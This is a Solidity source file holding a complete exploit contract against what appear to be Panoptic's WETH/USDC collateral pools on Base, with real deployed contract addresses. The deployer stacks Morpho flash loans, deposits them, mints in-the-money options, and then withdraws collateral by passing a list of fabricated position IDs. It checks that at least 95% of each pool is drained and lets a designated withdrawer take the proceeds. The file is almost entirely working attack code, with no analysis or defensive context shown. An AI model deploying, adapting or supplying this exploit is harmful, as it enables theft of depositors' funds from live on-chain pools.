// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "./Interfaces.sol";
import {TokenId} from "@types/TokenId.sol";

contract WETH_USDC5bpsBaseAttacker_Deployer {
    WETH_USDC5bpsBaseAttacker public attacker;
    IERC20Partial token0 = IERC20Partial(address(0x4200000000000000000000000000000000000006)); // weth
    IERC20Partial token1 = IERC20Partial(address(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913)); // usdc
    ICollateralTracker tracker0 = ICollateralTracker(address(0x40F3316dFd1BCdA29Cbaf0E03d68aE221CA716e2));
    ICollateralTracker tracker1 = ICollateralTracker(address(0xb151B11B14cF2Fee78e83739e8cdf7047Dc54b7F));
    constructor(address _withdrawer) {
        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        attacker = new WETH_USDC5bpsBaseAttacker(_withdrawer);
        attacker.takeFlashLoanAndAttack();
        uint256 attackerBalance0 = token0.balanceOf(address(attacker));
        uint256 attackerBalance1 = token1.balanceOf(address(attacker));
        require(attackerBalance0 >= (poolAssets0Before * 95) / 100);
        require(attackerBalance1 >= (poolAssets1Before * 95) / 100);
    }
}

contract WETH_USDC5bpsBaseAttacker is IMorphoFlashLoanCallback {
    uint256[] fake_token_uints = [16932343400165264, 16988277108887827, 17035745045722363, 16993655162578412, 17009206836208441, 17083582814389265, 16940269736292543, 16898430492320797, 17101708812844843, 16927858255610090, 17086352299123725, 16916111252789762, 17101378560687335, 17119985327481433, 17006045362593199, 17026674622507335, 17030439208130036, 17082751614160489, 17063366226512834, 17097157113273900, 17066504289794370, 16920834318597884, 16985606900097701, 17114928340284497, 16942964596981210, 17025612530710537, 16889820611195521, 16954544221541041, 16904132411153761, 16920216715452750, 17129587578817479, 16911017735677536, 16890694515986045, 17074540876198711, 17119951603807036, 17087492124011028, 17018492495701600, 16999873957325411, 17097995700960721, 17142266941213954, 17089567784803601, 16997018527186481, 16900417526689188, 17130624793684447, 17024105470881979, 16910690735799991, 17073485236538696, 16989089162921432, 17003020264083211, 17093568332869701, 17066233128463852, 16969179392893693, 17008221870292762, 16918871661380487, 17144420237880467, 17101150678162124, 16963022048440415, 17092584053216203, 17027825720482802, 17062001812029684, 16969369082248421, 16905463410247128, 16983642686367768, 17052541747857150, 17001603935953842, 17038292193577029, 16979809844856197, 17004266512915538, 17130759040409663, 17114800599387293, 16908625724213635, 17166195869489409, 17101208203141327, 16998904212967048, 16894658434788774, 16938993875545352, 17072849265831395, 17022720534783960, 17075863080850773, 17017661774688634, 17118102226994995, 16908153974732775, 16988465729292003, 17014445553286162, 16974767401004252, 16894355756410939, 17119602343874712, 16908893219668699, 16895531852075711, 17129841125473381, 17099849001593597, 16897926812058864, 17122672512185594, 17154365982004348, 16992035341009344, 17044600072961146, 17054951623905443, 16956101523846221, 17050277920000050, 17146520609095429, 16930194949943667, 16962955384487272, 17016931853357540, 17083148281277439, 17115324528783460, 17072588196537057, 17142593927072576, 16998536847852287, 17021660217262511, 16905067998086360, 17029938928325889, 17094514593261230, 16987242283774540, 16957874886315994, 17106588479166820, 17004523319620584, 17050369048063491, 17029065097821193, 17057227897167136, 17029873506273690, 16990649632113938, 16968539133849167, 16913491436315882, 16944179477276374, 16919590554483084, 16936365070053071, 16991628369728980, 17064829018677470, 16991286763756420, 17094346387673542, 17030010218713865, 16970073014124536, 16943603167087332, 3437866335631248550078689307201264, 3437866335631248550078689307201264];

    // On base
    IERC20Partial token0 = IERC20Partial(address(0x4200000000000000000000000000000000000006)); // weth
    IERC20Partial token1 = IERC20Partial(address(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913)); // usdc
    IMorpho morpho = IMorpho(address(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb));

    ICollateralTracker tracker0 = ICollateralTracker(address(0x40F3316dFd1BCdA29Cbaf0E03d68aE221CA716e2));
    ICollateralTracker tracker1 = ICollateralTracker(address(0xb151B11B14cF2Fee78e83739e8cdf7047Dc54b7F));
    IPanopticPool pp = IPanopticPool(address(0x000294305150d8A7Ae938cd0A798549d6D845e97));

    int24 constant MIN_V3POOL_TICK = -887272;
    int24 constant MAX_V3POOL_TICK = 887272;

    address private immutable withdrawer;

    bool private executed = false;

    constructor(address _withdrawer) {
        withdrawer = _withdrawer;
    }

    modifier onlyWithdrawer() {
        require(msg.sender == withdrawer, "Only constructor-supplied withdrawer can call this function");
        _;
    }

    function takeFlashLoanAndAttack() public {
        require(!executed);
        // take flash loan
        (uint256 poolAssets0, , ) = tracker0.getPoolData();
        (uint256 poolAssets1, , ) = tracker1.getPoolData();
        {
            // Initiate first flash loan for token0
            uint256 borrowAmount0 = 2 * poolAssets0;
            // Encode the token1 borrow amount for the nested loan
            bytes memory data = abi.encode(borrowAmount0, 2 * poolAssets1, true);
            morpho.flashLoan(address(token0), borrowAmount0, data);
        }
        executed = true;
    }

    uint256 private token0Amount; // Store for nested callback
    function onMorphoFlashLoan(
        uint256 amount,
        bytes calldata data
    ) external override {
        require(!executed);

        (uint256 amount0, uint256 amount1, bool isFirstLoan) =
                    abi.decode(data, (uint256, uint256, bool));

        if (isFirstLoan) {
            // Store token0 amount for later
            token0Amount = amount0;

            // Initiate nested flash loan for token1
            bytes memory nestedData = abi.encode(amount0, amount1, false);
            morpho.flashLoan(address(token1), amount1, nestedData);

            // After the nested callback completes, approve token0 repayment
            token0.approve(address(morpho), amount0);
        } else {
            // This is the nested (token1) flash loan callback
            // We now have both tokens - execute the attack
            drainPool();

            // Approve token1 repayment for the nested loan
            token1.approve(address(morpho), amount1);
        }
    }

    function drainPool() internal {
        // - deposit funds
        (uint256 attackAmount0, , ) = tracker0.getPoolData();
        (uint256 attackAmount1, , ) = tracker1.getPoolData();
        token0.approve(address(tracker0), type(uint104).max);
        token1.approve(address(tracker1), type(uint104).max);

        tracker0.deposit(uint128(token0.balanceOf(address(this))), address(this));
        tracker1.deposit(uint128(token1.balanceOf(address(this))), address(this));

        // - mint ITM options
        TokenId[] memory posIdList = new TokenId[](1);
        posIdList[0] = TokenId.wrap(3778244379283210753106079020900);
        TokenId[] memory posIdList2 = new TokenId[](2);
        posIdList2[0] = TokenId.wrap(3778244379283210753106079020900);
        posIdList2[1] = TokenId.wrap(2535301209956535045180433266532);

        // --- for Asset 0
        pp.mintOptions(
            posIdList, // positionIdList
            uint128(attackAmount0), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK // tickLimitHigh
        );

        // --- for Asset 1
        pp.mintOptions(
            posIdList2, // positionIdList
            uint128(attackAmount1), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK // tickLimitHigh
        );

        // ---------------------------------------------------------------------
        // - withdraw funds with fake position list

        // Create a list of positions that don't exist
        TokenId[] memory fakeTokenIdList = generateTokenIdListFromFakeTokenUints();

        // Now use the list of positions that don't exist

        // 1. calculate how much I can withdraw
        uint256 intermediateBalance0 = tracker0.balanceOf(address(this));
        uint256 toWithdraw0 = tracker0.convertToAssets(intermediateBalance0);
        // 2. withdraw with fake list
        tracker0.withdraw(toWithdraw0, address(this), address(this), fakeTokenIdList);

        // repeat for token1
        uint256 intermediateBalance1 = tracker1.balanceOf(address(this));
        uint256 toWithdraw1 = tracker1.convertToAssets(intermediateBalance1);
        tracker1.withdraw(toWithdraw1, address(this), address(this), fakeTokenIdList);

        // now liquidate my own position and repeat...
        // NOTE: Now that we execute the attack with a single drainPool, no need to do this - just
        // leave the uncollateralised positions open
        /* TokenId[] memory emptyTokenList = new TokenId[](0);
        pp.liquidate(emptyTokenList, address(this), posIdList2); */
    }

    function generateTokenIdListFromFakeTokenUints() internal view returns (TokenId[] memory fakeTokenIdList) {
        fakeTokenIdList = new TokenId[](fake_token_uints.length);
        for (uint16 i = 0; i < fake_token_uints.length;) {
            fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
            unchecked {
              ++i;
            }
        }
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function withdraw(address tokenAddress, uint256 amount) external onlyWithdrawer {
        if (tokenAddress == address(0)) {
            // Withdraw ETH
            require(address(this).balance >= amount, "Insufficient ETH balance");
            (bool success, ) = payable(withdrawer).call{value: amount}("");
            require(success, "ETH transfer failed");
        } else {
            // Withdraw ERC20 token
            IERC20Partial token = IERC20Partial(tokenAddress);
            require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
            token.transfer(withdrawer, amount); // revert if token transfer fails
        }
    }

    // Required to receive ETH when unwrapping WETH
    receive() external payable {
        // Accept ETH from WETH unwrapping
    }

    // Fallback for any other ETH transfers
    fallback() external payable {
        // Handle unexpected ETH transfers
    }
}
